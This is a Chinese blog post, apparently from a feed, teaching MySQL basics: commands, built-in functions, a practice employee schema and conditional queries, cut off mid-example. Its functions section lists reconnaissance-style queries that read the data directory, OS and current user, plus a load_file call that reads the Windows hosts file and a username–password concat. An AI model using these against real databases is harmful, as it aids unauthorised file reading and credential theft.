    <title>MYSQL基础全</title>
    <link href="https://xizhi-future.github.io/2021/11/21/MYSQL%E5%9F%BA%E7%A1%80%E5%85%A8/"/>
    <id>https://xizhi-future.github.io/2021/11/21/MYSQL%E5%9F%BA%E7%A1%80%E5%85%A8/</id>
    <published>2021-11-21T10:25:42.000Z</published>
    <updated>2021-11-21T10:27:16.464Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="MYSQL-数据库"><a href="#MYSQL-数据库" class="headerlink" title="MYSQL 数据库"></a>MYSQL 数据库</h1><h2 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h2><h3 id="sql，DB，-DBMS-概念理解"><a href="#sql，DB，-DBMS-概念理解" class="headerlink" title="sql，DB， DBMS   概念理解"></a>sql，DB， DBMS   概念理解</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DB：DataBase 数据库<span class="comment">--在硬盘上以 **文件** 的形式存在</span></span><br><span class="line">DBMS：DataBase Management <span class="keyword">System</span> 数据库管理系统</span><br><span class="line">常见的数据库管理系统：Oracle，Mysql，DB2，Sybase，SqlServer</span><br><span class="line"><span class="keyword">SQL</span>：结构化查询语言，是一门标准通用的高级语言。标准的<span class="keyword">sql</span>适合所有的数据库产品。</span><br><span class="line">注：</span><br><span class="line"><span class="keyword">sql</span> 语句在执行的时候，首先在内部进行编译，然后才执行<span class="keyword">sql</span>语句，它的编译由DBMS完成。</span><br><span class="line">三者关系：DBMS通过执行 <span class="keyword">sql</span> 语句来操作 DB 当中的数据</span><br></pre></td></tr></table></figure><h3 id="表"><a href="#表" class="headerlink" title="表"></a>表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">数据库的基本组成单元，所有的数据都以表格的形式组织</span><br><span class="line">一个表包括：</span><br><span class="line">行(data)：被称为  数据 <span class="operator">/</span> 记录</span><br><span class="line">列(<span class="keyword">column</span>)：被称为  字段</span><br><span class="line">字段的属性：</span><br><span class="line">字段名，数据类型，相关的约束</span><br></pre></td></tr></table></figure><h2 id="二、SQL-语句分类："><a href="#二、SQL-语句分类：" class="headerlink" title="二、SQL 语句分类："></a>二、SQL 语句分类：</h2><blockquote><p> 1.**DQL(数据查询语言)**：查询语句，所有的 select 语句<br> 2.**DML(数据操作语言)**：insert , delete , update , 对表中的 <strong>数据</strong> 进行 增删改<br> 3.**DDL(数据定义语言)**：create , drop , alter 对表 <strong>结构</strong> 的 增删改<br> 4.**TCL(事务控制语言)**：commit 提交数据，rollback 回滚数据 Transaction<br> 5.**DCL(数据控制语言)**：grant 授权，revoke 撤销权限等</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">注：</span><br><span class="line">1.任何一条 sql语句 以`;`结尾</span><br><span class="line">2.sql语句 不区分大小写</span><br><span class="line">3.字段可参与数学运算</span><br><span class="line">4.字符串要用单引号引起来</span><br></pre></td></tr></table></figure><h2 id="三、-Mysql-常用命令"><a href="#三、-Mysql-常用命令" class="headerlink" title="三、 Mysql 常用命令"></a>三、 Mysql 常用命令</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">查库：</span><br><span class="line"><span class="keyword">show</span> databases；</span><br><span class="line">建库：</span><br><span class="line"><span class="keyword">create</span> database <span class="operator">+</span> 库名;</span><br><span class="line">删库：</span><br><span class="line"><span class="keyword">drop</span> database <span class="operator">+</span> 库名;</span><br><span class="line">进入指定数据库：</span><br><span class="line">use <span class="operator">+</span> 库名；</span><br><span class="line">查看当前数据库中的表：</span><br><span class="line"><span class="keyword">show</span> tables；</span><br><span class="line">查看其他数据库中的表：</span><br><span class="line"><span class="keyword">select</span> tables <span class="keyword">from</span> <span class="operator">+</span> 其它库中的表名;</span><br><span class="line">查看表的结构：</span><br><span class="line"><span class="keyword">desc</span> <span class="operator">+</span> 表名;   </span><br><span class="line">查看创建表的语句：</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> <span class="operator">+</span> 表名;</span><br><span class="line">查列：</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">+</span> 表名；</span><br><span class="line">查询当前使用的数据库：</span><br><span class="line"><span class="keyword">select</span> database();</span><br><span class="line">查看数据库版本：</span><br><span class="line"><span class="keyword">select</span> version();</span><br><span class="line">终止一条语句：\c</span><br><span class="line">退出mysql: \q(ctrl<span class="operator">+</span>c)  quit  exit </span><br></pre></td></tr></table></figure><p><strong>导入数据</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当希望导入一个 较大 的文件或者是想要批量的执行<span class="keyword">sql</span>语句时，可以使用 mysql 中的 source 命令</span><br><span class="line">使用方法：source <span class="operator">+</span> 文件路径</span><br></pre></td></tr></table></figure><h2 id="四、增删改查-CRUD"><a href="#四、增删改查-CRUD" class="headerlink" title="四、增删改查 CRUD"></a>四、增删改查 CRUD</h2><blockquote><p><strong>增（Create）<br>检索（Retrieve）<br>修改（Update）<br>删除（Delete）</strong></p></blockquote><h2 id="五、常用内置函数"><a href="#五、常用内置函数" class="headerlink" title="五、常用内置函数"></a>五、常用内置函数</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">floor</span>()#向下取整</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">floor</span>(<span class="string">&#x27;z&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">floor</span>(<span class="string">&#x27;z&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span>, <span class="number">1</span> warning (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">floor</span>(<span class="string">&#x27;1.23&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">floor</span>(<span class="string">&#x27;1.23&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+</span></span><br><span class="line"><span class="operator">|</span>             <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">rand()#返回 <span class="number">0</span><span class="number">-1</span> 之间的随机数</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> rand();</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------+</span></span><br><span class="line"><span class="operator">|</span> rand()               <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">0.032002185501160275</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> rand();</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> rand()             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">0.5766042141025925</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">left</span>(&quot;welcome&quot;,<span class="number">3</span>)# wel</span><br><span class="line"><span class="keyword">right</span>(&quot;hello&quot;,<span class="number">2</span>)# lo</span><br><span class="line"><span class="built_in">position</span>(&quot;m&quot; <span class="keyword">in</span> &quot;welcome&quot;)  # <span class="number">6</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 取 <span class="number">0</span><span class="number">-9</span> 之间的随机整数</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">10</span>)<span class="operator">+</span><span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"># 截取部分</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">left</span>(<span class="string">&#x27;xxx@qq.com&#x27;</span>,<span class="built_in">position</span>(<span class="string">&#x27;@&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;xxx@qq.com&#x27;</span>)<span class="number">-1</span>);  # xxx</span><br><span class="line"></span><br><span class="line"># 格式输出时间</span><br><span class="line"><span class="keyword">select</span> date_format(now(),<span class="string">&#x27;%Y-%m-%d&#x27;</span>); # <span class="number">2021</span><span class="number">-11</span><span class="number">-21</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @<span class="variable">@datadir</span>;# 返回数据库存储目录 D:\phpstudy_pro\Extensions\MySQL5<span class="number">.7</span><span class="number">.26</span>\data\</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@version</span>_compile_os;  # 查看服务器操作系统  Win64</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>();  #  root<span class="variable">@localhost</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">current_user</span>();</span><br><span class="line"><span class="keyword">select</span> database();</span><br><span class="line"><span class="keyword">select</span> version();</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">current_user</span>();</span><br><span class="line"></span><br><span class="line">concat(username,&quot;--&quot;,password);</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(&quot;c:\\windows\\drivers\\etc\\hosts&quot;);</span><br></pre></td></tr></table></figure><h1 id="做练习的数据库，表的结构"><a href="#做练习的数据库，表的结构" class="headerlink" title="做练习的数据库，表的结构"></a>做练习的数据库，表的结构</h1><p>资源如下：<br><a href="https://pan.baidu.com/s/1iA47qGloJYrVriwF43QpMg">https://pan.baidu.com/s/1iA47qGloJYrVriwF43QpMg</a><br>提取码：65yv </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> tables;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="operator">|</span> Tables_in_myworld <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="operator">|</span> dept              <span class="operator">|</span>   部门表</span><br><span class="line"><span class="operator">|</span> emp               <span class="operator">|</span>   员工表</span><br><span class="line"><span class="operator">|</span> salgrade          <span class="operator">|</span>   工资等级表</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">desc</span> dept;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> Field  <span class="operator">|</span> Type        <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> DEPTNO <span class="operator">|</span> <span class="type">int</span>(<span class="number">2</span>)      <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span> PRI <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span> 部门编号</span><br><span class="line"><span class="operator">|</span> DNAME  <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">14</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span> 部门名称</span><br><span class="line"><span class="operator">|</span> LOC    <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">13</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span> 部门位置</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-------------+------+-----+---------+-------+</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">desc</span> emp;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> Field    <span class="operator">|</span> Type        <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> EMPNO    <span class="operator">|</span> <span class="type">int</span>(<span class="number">4</span>)      <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span> PRI <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span> 员工编号</span><br><span class="line"><span class="operator">|</span> ENAME    <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">10</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span> 员工姓名</span><br><span class="line"><span class="operator">|</span> JOB      <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">9</span>)  <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span> 工作岗位</span><br><span class="line"><span class="operator">|</span> MGR      <span class="operator">|</span> <span class="type">int</span>(<span class="number">4</span>)      <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span> 上级领导编号</span><br><span class="line"><span class="operator">|</span> HIREDATE <span class="operator">|</span> <span class="type">date</span>        <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span> 入职日期</span><br><span class="line"><span class="operator">|</span> SAL      <span class="operator">|</span> <span class="keyword">double</span>(<span class="number">7</span>,<span class="number">2</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span> 月薪</span><br><span class="line"><span class="operator">|</span> COMM     <span class="operator">|</span> <span class="keyword">double</span>(<span class="number">7</span>,<span class="number">2</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span> 补助<span class="operator">/</span>津贴</span><br><span class="line"><span class="operator">|</span> DEPTNO   <span class="operator">|</span> <span class="type">int</span>(<span class="number">2</span>)      <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span> 部门编号</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------+------+-----+---------+-------+</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">desc</span> salgrade;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+---------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> Field <span class="operator">|</span> Type    <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+---------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> GRADE <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span> 等级</span><br><span class="line"><span class="operator">|</span> LOSAL <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span> 最低薪资</span><br><span class="line"><span class="operator">|</span> HISAL <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span> 最高薪资</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+---------+------+-----+---------+-------+</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="多表查询"><a href="#多表查询" class="headerlink" title="多表查询"></a>多表查询</h1><h1 id="DQL-数据查询语言"><a href="#DQL-数据查询语言" class="headerlink" title="DQL(数据查询语言)"></a>DQL(数据查询语言)</h1><h3 id="一、简单的查询语句-DQL"><a href="#一、简单的查询语句-DQL" class="headerlink" title="一、简单的查询语句 (DQL)"></a>一、简单的查询语句 (DQL)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">语法格式：</span><br><span class="line"><span class="keyword">select</span> 字段名<span class="number">1</span>，字段名<span class="number">2</span>，字段名<span class="number">3</span>，......<span class="keyword">from</span> <span class="operator">+</span> 表名；</span><br><span class="line">查询所有字段：</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">+</span> 表名;</span><br><span class="line">给查询结果的列重命名：</span><br><span class="line"><span class="keyword">select</span> 字段名 <span class="keyword">as</span> 新名 <span class="keyword">from</span> <span class="operator">+</span> 表名;</span><br><span class="line"><span class="keyword">select</span> 字段名 新名 <span class="keyword">from</span> <span class="operator">+</span> 表名;</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="number">1</span><span class="operator">+</span><span class="number">2</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span><span class="operator">+</span><span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----+</span></span><br><span class="line"><span class="operator">|</span>   <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">注：</span><br><span class="line">中文要用引号引起来(最好都使用单引号，由于双引号不通用)</span><br><span class="line"><span class="keyword">as</span> 关键字可省略，用 空格 代替</span><br></pre></td></tr></table></figure><h3 id="二、条件查询"><a href="#二、条件查询" class="headerlink" title="二、条件查询"></a>二、条件查询</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语法格式：</span><br><span class="line"><span class="keyword">select</span> 字段<span class="number">1</span>，字段<span class="number">2</span>，...... <span class="keyword">from</span> <span class="operator">+</span> 表名 <span class="keyword">where</span> <span class="operator">+</span> 条件;</span><br></pre></td></tr></table></figure><h4 id="常用运算符"><a href="#常用运算符" class="headerlink" title="常用运算符"></a>常用运算符</h4><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td>=</td><td>等于</td></tr><tr><td>&lt;&gt; 或 !=</td><td>不等于</td></tr><tr><td>&gt;</td><td>大于</td></tr><tr><td>&gt;=</td><td>大于等于</td></tr><tr><td>&lt;</td><td>小于</td></tr><tr><td>&lt;=</td><td>小于等于</td></tr><tr><td>is NULL</td><td>为NULL</td></tr><tr><td>and</td><td>并且</td></tr><tr><td>or</td><td>或者</td></tr><tr><td>in</td><td>是否为这几个值</td></tr><tr><td>not</td><td>非，与is 和in 结合使用</td></tr><tr><td>like</td><td>模糊查询，支持%或下划线匹配</td></tr><tr><td><code>between...and...</code></td><td>一个范围，含边界 (前面数字必须小于等于后面的数字)，等价于 <code>&gt;= and &lt;=</code></td></tr></tbody></table><p><strong>between…and…</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">例如：</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">between</span> <span class="number">2</span> <span class="keyword">and</span> <span class="number">8</span>;</span><br><span class="line"> 等价于</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">&gt;=</span><span class="number">2</span> <span class="keyword">and</span> id <span class="operator">&lt;=</span><span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">between</span> <span class="number">8</span> <span class="keyword">and</span> <span class="number">2</span>;  是无效的</span><br><span class="line">注：between...and...可以用于字符串查询<span class="operator">-</span>左闭右开 </span><br><span class="line">例如：<span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">between</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;c&#x27;</span>; 指查看a<span class="operator">~</span>b的信息</span><br></pre></td></tr></table></figure><p><strong>is NULL 与 is not NULL</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">NULL</span>与<span class="number">0</span>的区别：</span><br><span class="line">数据库中 <span class="keyword">NULL</span> 不是一个值，代表为空，不能使用 <span class="operator">=</span> 衡量；<span class="number">0</span> 是一个值，并不为空。</span><br><span class="line">注：判断是否为<span class="keyword">NULL</span>时，使用的是 <span class="keyword">is</span> 或者是 <span class="keyword">is</span> <span class="keyword">not</span>,而不是 <span class="operator">=</span> 。</span><br></pre></td></tr></table></figure><p><strong>and 与 or</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> 的优先级高于 <span class="keyword">or</span>, 必要时使用()括起来</span><br></pre></td></tr></table></figure><p><strong>in 与 not in</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">in</span>(<span class="number">5</span>,<span class="number">8</span>);等价于<span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">5</span> <span class="keyword">or</span> id<span class="operator">=</span><span class="number">8</span>;</span><br><span class="line">指查找出 id<span class="operator">=</span><span class="number">5</span> 和 id<span class="operator">=</span><span class="number">8</span> 的用户的密码</span><br><span class="line"><span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">not</span> <span class="keyword">in</span>(<span class="number">5</span>,<span class="number">8</span>);</span><br><span class="line">指查找出 id不等于<span class="number">5</span> 和 id不等于<span class="number">8</span> 的用户的密码</span><br><span class="line">注：不是 <span class="number">5</span><span class="operator">~</span><span class="number">8</span>，<span class="keyword">in</span>之后不是一个区间 </span><br></pre></td></tr></table></figure><p><strong>like</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">两个特殊字符：</span><br><span class="line"><span class="number">1.</span><span class="operator">%</span> 代表任意多个字符</span><br><span class="line"><span class="number">2.</span>_ 代表任意一个字符</span><br><span class="line">例如：</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;%b%&#x27;</span>;</span><br><span class="line">指查找出用户名中带有字母b的用户名</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;_a%&#x27;</span>;</span><br><span class="line">指查找出用户名中带第二个字母为a的用户名</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;%b&#x27;</span>;</span><br><span class="line">指查找出用户名中带最后一个字母为b的用户名</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> 